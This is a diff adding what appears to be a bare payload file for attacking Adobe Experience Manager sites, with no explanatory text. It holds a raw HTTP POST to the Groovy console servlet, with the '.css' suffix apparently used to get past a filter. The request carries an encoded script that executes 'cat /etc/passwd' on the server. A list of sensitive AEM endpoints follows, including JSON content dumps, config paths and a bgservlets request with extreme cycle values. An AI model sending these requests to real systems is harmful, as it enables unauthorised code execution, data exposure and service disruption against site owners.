@@ -1,0 +1,24 @@
+POST /bin/groovyconsole/post.servlet.css HTTP/1.1
+Host: SITENAME
+User-Agent: curl/7.30.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 163
+
+script=def%20command%20%3D%20%22cat /etc/passwd%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22
+------------------------------------------------------------------------
+/etc/groovyconsole.html 
+/content.ext.infinity.1..json%3ftidy%3dtrue
+/system/bgservlets/test.json%3fcycles%3d999999%26interval%3d0%26flushEvery%3d111111111 
+/jcr%3acontent.json
+/.childrenlist.json
+/content/{BUNDLENAME}/{APPNAME}/master/configuration/sitewsconfiguration/jcr:content/parsys/.config.author.1.json 
+/content/{BUNDLENAME}/demo/en_US/configuration/sitewsconfiguration/.tidy.3.json 
+/bin/groovyconsole/audit.servlet 
+/etc/groovyconsole.html?script=2018/01/11/record8 
+/en_US/configuration/sitewsconfiguration/__content/parsys/.html
+/content//demo/en_US/configuration/sitewsconfiguration/_jcr_content/parsys
+/content//demo/en_US/configuration/sitewsconfiguration/_jcr_content
+/content//demo/en_US/configuration/sitewsconfiguration
